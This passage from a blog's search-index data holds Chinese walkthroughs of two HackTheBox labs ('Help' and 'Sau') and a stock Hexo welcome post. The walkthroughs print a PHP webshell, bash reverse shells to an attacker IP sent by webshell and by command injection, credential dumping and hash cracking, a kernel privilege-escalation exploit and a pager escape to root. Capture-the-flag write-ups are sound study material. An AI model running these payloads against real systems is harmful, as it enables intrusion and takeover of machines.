introspection获取用户凭据（用户名和MD5密码哈希）\n使用hashcat破解MD5哈希获得明文密码\n利用HelpDeskZ文件上传漏洞（CVE-2016-10134）上传PHP webshell\n通过时间戳暴力破解找到上传文件位置，获得webshell\n反向shell获得help用户权限\n利用内核漏洞CVE-2017-16995提权至root\n\n端口扫描全端口扫描sudo nmap -sT --min-rate 10000 -p- 10.129.102.184\n\n参数解析：\n\n-sT: TCP连接扫描，完整三次握手\n--min-rate 10000: 最小发包速率，加快扫描速度\n-p-: 扫描全部65535端口\n\n详细服务扫描nmap -sT -sC -sV -T3 -p 22,80,3000 10.129.102.184\n\n参数解析：\n\n-sC: 使用默认NSE脚本集合\n-sV: 版本探测识别服务版本\n-T3: 时序模板，正常速度扫描\n\n扫描结果：\n\n22&#x2F;tcp: SSH (OpenSSH 7.2p2)\n80&#x2F;tcp: HTTP (Apache 2.4.18) - 重定向到help.htb\n3000&#x2F;tcp: HTTP (Node.js Express)\n\n域名配置和Web服务分析域名解析配置echo &quot;10.129.102.184 help.htb&quot; &gt;&gt; /etc/hosts\n\n原因： HTTP服务重定向到help.htb域名，需要配置本地解析\nHTTP服务分析（80端口）访问http://help.htb发现HelpDeskZ帮助台系统\n目录枚举gobuster dir -u http://help.htb -w /usr/share/wordlists/dirb/common.txt\n\n参数解析：\n\ndir: 目录暴力破解模式\n-u: 目标URL\n-w: 字典文件路径\n\n重要发现：\n\n/support/ - HelpDeskZ主目录\n/support/uploads/tickets/ - 文件上传目录\n\nGraphQL API分析（3000端口）Schema Introspection查询curl -X POST http://10.129.102.184:3000/graphql \\  -H &quot;Content-Type: application/json&quot; \\  -d &#x27;&#123;&quot;query&quot;:&quot;&#123; __schema &#123; queryType &#123; fields &#123; name description type &#123; name &#125; &#125; &#125; &#125; &#125;&quot;&#125;&#x27;\n\nGraphQL Introspection原理：\n\n__schema: GraphQL内省查询，获取API结构信息\nqueryType: 查询根类型的字段信息\nfields: 获取所有可用字段和类型\n\n关键发现：\n\n存在user字段，返回类型为User\nUser类型包含username和password字段\n\n敏感数据获取curl -X POST http://10.129.102.184:3000/graphql \\  -H &quot;Content-Type: application/json&quot; \\  -d &#x27;&#123;&quot;query&quot;:&quot;&#123; user &#123; username password &#125; &#125;&quot;&#125;&#x27;\n\nGraphQL查询语法：\n\n&#123; user &#123; username password &#125; &#125;: 查询user对象的username和password字段\nGraphQL允许精确指定需要的字段，减少数据传输\n\n获得凭据：\n\n用户名: helpme@helpme.com\n密码哈希: 5d3c93182bb20f07b994a7f617e99cff (MD5格式)\n\n密码破解MD5哈希识别echo &quot;5d3c93182bb20f07b994a7f617e99cff&quot; | wc -c# 输出33（32个字符+换行），确认为MD5哈希\n\nHashcat暴力破解echo &quot;5d3c93182bb20f07b994a7f617e99cff&quot; &gt; hash.txthashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force\n\n参数解析：\n\n-m 0: 指定哈希类型为MD5\n--force: 强制执行（忽略警告）\n/usr/share/wordlists/rockyou.txt: 常用密码字典\n\n破解结果： godhelpmeplz\nHelpDeskZ文件上传漏洞利用漏洞分析（CVE-2016-10134）漏洞机制：\n\nHelpDeskZ允许上传文件作为工单附件\n上传文件被重命名为：md5(原文件名 + 当前时间戳).扩展名\n文件保存在/support/uploads/tickets/目录\n攻击者可通过时间戳暴力破解找到上传文件\n\n登录HelpDeskZ使用获得的凭据：\n\n用户名: helpme@helpme.com\n密码: godhelpmeplz\n\nPHP Webshell上传创建简单的PHP后门：\n&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;\n\n保存为： shell.php\n文件上传和定位# 上传shell.php文件后，使用exploit脚本暴力破解文件名searchsploit -m php/webapps/40300.pypython2 40300.py http://help.htb/support/uploads/tickets/ shell.php\n\n时间戳暴力破解原理：\n\n记录文件上传时间\n在时间范围内生成可能的时间戳\n计算MD5(filename + timestamp)\n尝试访问生成的文件名\n\n成功找到文件：\nhttp://help.htb/support/uploads/tickets/1b49bd4428aad1302865ab863d69e2b0.php\n\n反向Shell获取# 启动监听器nc -nlvp 4444# 通过webshell执行反向shell命令curl &quot;http://help.htb/support/uploads/tickets/1b49bd4428aad1302865ab863d69e2b0.php?cmd=bash%20-c%20&#x27;bash%20-i%20&gt;&amp;%20/dev/tcp/10.10.16.13/4444%200&gt;&amp;1&#x27;&quot;\n\nURL编码解析：\n\n%20: 空格\n&gt;&amp;: 重定向标准输出和错误输出\n/dev/tcp/IP/PORT: Bash特殊文件，建立TCP连接\n\n成功获得shell： help@help\n权限提升系统信息收集uname -a# Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64cat /proc/version# Linux version 4.4.0-116-genericid# uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n\n内核漏洞识别目标系统： Ubuntu 16.04.4 LTS，内核版本4.4.0-116-generic 已知漏洞： CVE-2017-16995（eBPF verifier漏洞）\n漏洞利用# 搜索对应exploitsearchsploit -m linux/local/44298.c\n\nCVE-2017-16995漏洞原理：\n\neBPF（extended Berkeley Packet Filter）verifier存在整数溢出漏洞\n攻击者可构造特殊的eBPF程序绕过验证\n在内核空间执行任意代码，实现权限提升\n\n# 编译exploitgcc 44298.c -o pwnchmod +x pwn# 执行提权exploit./pwn\n\n预期输出：\ntask_struct = ffff88003b591c00uidptr = ffff88003d0bac04spawning root shell\n\n注意事项：\n\n此exploit针对特定内核版本（4.4.0-116）\n某些环境配置可能导致”Invalid argument”错误\n需要具备基本的系统调用权限\n\nFlag获取User Flagcat /home/help/user.txt\n\nRoot Flagcat /root/root.txt\n\n关键技术总结GraphQL安全测试：\n\nSchema introspection查询技术\n敏感数据泄露检测\nGraphQL查询语法应用\n\n文件上传漏洞利用：\n\nHelpDeskZ特定漏洞机制\n时间戳暴力破解技术\nMD5文件名预测算法\n\nLinux内核提权：\n\neBPF verifier漏洞利用\n内核版本漏洞映射\n系统调用劫持技术\n\nWeb Shell技术：\n\nPHP一句话后门\nURL编码绕过\n反向Shell建立\n\n","categories":["OSCP"],"tags":["Hackthebox","Linux Boxes"]},{"title":"Hello World","url":"/2025/05/13/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick Start\nCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","categories":["博客搭建"],"tags":["Hexo","博客","教程"]},{"title":"Sau","url":"/2025/05/24/Sau/","content":"Sau HTB 渗透测试笔记整体渗透思路\n端口扫描发现55555端口运行Request-Baskets v1.2.1\n搜索CVE发现CVE-2023-27163 SSRF漏洞\n利用SSRF访问内网80端口，发现Maltrail v0.53应用\n利用Maltrail登录功能RCE漏洞获得puma用户shell\n发现sudo systemctl权限，利用pager逃逸技术提权至root\n\n端口扫描初始扫描nmap -Pn 10.129.229.26\n\n参数解析：\n\n-Pn: 跳过主机发现，直接进行端口扫描（假设主机存活）\n适用于禁ping的主机或防火墙过滤ICMP的环境\n\n扫描结果：\n\n55555&#x2F;tcp: HTTP服务（非标准端口）\n\n详细服务识别nmap -sC -sV -p 55555 10.129.229.26\n\n参数解析：\n\n-sC: 默认脚本扫描\n-sV: 版本识别\n-p 55555: 指定端口扫描\n\nWeb服务分析应用识别访问 http://10.129.229.26:55555/web 发现：\nPowered by &lt;a href=&quot;https://github.com/darklynx/request-baskets&quot;&gt;request-baskets&lt;/a&gt; |Version: 1.2.1\n\nRequest-Baskets功能分析：\n\nHTTP请求收集服务\n允许创建”basket”收集和转发HTTP请求\n提供请求转发和代理功能\n\nCVE漏洞搜索# Google搜索关键词&quot;request-baskets 1.2.1 CVE&quot;\n\n搜索技巧：\n\n软件名 + 版本号 + CVE 是快速发现已知漏洞的有效方法\n关注GitHub Issues、安全公告、漏洞数据库\n\n发现漏洞：\n\nCVE-2023-27163: Server-Side Request Forgery (SSRF)\n影响版本：request-baskets ≤ v1.2.1\n漏洞组件：/api/baskets/&#123;name&#125;\n\nSSRF漏洞利用漏洞原理Request-baskets的basket配置功能存在SSRF漏洞：\n&#123;  &quot;forward_url&quot;: &quot;http://127.0.0.1:80&quot;,  &quot;proxy_response&quot;: true,  &quot;insecure_tls&quot;: false,  &quot;expand_path&quot;: true,  &quot;capacity&quot;: 250&#125;\n\n关键参数解析：\n\nforward_url: 转发目标URL（可控制访问任意内网地址）\nproxy_response: 启用时返回目标服务器的响应内容\nexpand_path: 保持请求路径\n\n获取现成Exploitwget https://raw.githubusercontent.com/mathias-mrsn/request-baskets-v121-ssrf/master/exploit.py\n\n内网服务探测# 探测SSH服务python3 exploit.py http://10.129.229.26:55555 http://127.0.0.1:22\n\n探测原理：\n\n创建basket并配置转发到内网地址\n通过代理响应功能获取内网服务信息\n\n# 探测常见HTTP端口python3 exploit.py http://10.129.229.26:55555 http://127.0.0.1:80python3 exploit.py http://10.129.229.26:55555 http://127.0.0.1:8080\n\n内网应用发现curl http://10.129.229.26:55555/sukxyw\n\n响应分析：\n&lt;title&gt;Maltrail&lt;/title&gt;...Powered by Maltrail (v0.53)\n\n发现内网应用： Maltrail v0.53 网络威胁检测系统\n内网应用攻击目录枚举gobuster dir -u http://10.129.229.26:55555/sukxyw -w /usr/share/wordlists/dirb/common.txt --exclude-length 92 -b 502\n\n参数解析：\n\n--exclude-length 92: 排除响应长度为92的结果（通常是404页面）\n-b 502: 排除502状态码（Bad Gateway）\n\n发现端点：\n\n/login (Status: 401) - 认证端点\n/counts (Status: 401) - 统计端点\n/events (Status: 401) - 事件端点\n\nMaltrail RCE漏洞漏洞研究：\n\nMaltrail v0.53存在登录功能命令注入漏洞\n漏洞位置：/login POST请求的username参数\n无需认证即可触发\n\n漏洞原理：\n# Maltrail登录处理逻辑（伪代码）username = request.form.get(&#x27;username&#x27;)# 直接将用户输入传递给系统命令，未做过滤os.system(f&quot;some_command &#123;username&#125;&quot;)\n\n反弹Shell利用# 启动监听器nc -lnvp 4444\n\n监听器参数：\n\n-l: 监听模式\n-n: 不进行DNS解析\n-v: 详细输出\n-p 4444: 监听端口4444\n\n# RCE Payload执行curl -X POST &quot;http://10.129.229.26:55555/sukxyw/login&quot; \\  -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \\  -d &quot;username=;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.13/4444 0&gt;&amp;1&#x27;&amp;password=admin&quot;\n\nPayload解析：\n\n;bash -c &#39;...&#39;: 分号结束前一个命令，执行新命令\nbash -i: 交互式bash shell\n&gt;&amp; /dev/tcp/IP/PORT: 重定向输入输出到TCP连接\n0&gt;&amp;1: 标准输入重定向到标准输出\n\n成功获得shell： puma@sau\n权限提升Shell稳定化python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;export TERM=xterm\n\n稳定化技术：\n\npty.spawn(): 生成伪终端，支持Tab补全等功能\nexport TERM=xterm: 设置终端类型，支持颜色显示\n\n权限枚举sudo -l\n\nsudo权限发现：\nUser puma may run the following commands on sau:    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service\n\n权限分析：\n\n(ALL : ALL): 可以以任何用户和组身份执行\nNOPASSWD: 无需输入密码\n限制命令：只能执行systemctl status trail.service\n\nPager逃逸技术漏洞原理：\n\nsystemctl status 使用pager（通常是less）显示长输出\nPager程序继承了systemctl的执行权限（root）\nLess pager支持!command语法执行shell命令\n通过pager执行的命令将以root权限运行\n\n利用步骤：\n# 执行sudo命令sudo /usr/bin/systemctl status trail.service\n\n在less pager界面中：\n# 输入感叹号后跟命令!/bin/bash\n\n技术细节：\n\nLess pager的!功能允许执行外部命令\n由于less以root权限运行，执行的命令也具有root权限\n这是一种经典的pager逃逸技术\n\n成功获得root权限： root@sau\n其他Pager逃逸命令# 其他可能的pager逃逸!sh!/bin/sh!bash\n\n获取FlagUser Flagcat /home/puma/user.txt\n\nRoot Flagfind / -name &quot;root.txt&quot; 2&gt;/dev/nullcat /root/root.txt\n\n关键技术总结SSRF攻击技术：\n\nRequest-baskets配置转发URL\n利用proxy_response获取内网响应\n内网服务发现和端口扫描\n\n命令注入技术：\n\nPOST参数注入\nBash反向shell技术\n特殊字符绕过（分号分隔命令）\n\n权限提升技术：\n\nSudo权限枚举\nPager逃逸攻击\n程序权限继承利用\n\n常见Pager逃逸向量：\n\nsystemctl status → less pager\nman → less pager\njournalctl → less pager\ngit log → less pager\n\n","categories":["OSCP"],"tags":["Hackthebox","Linux Boxes"]}]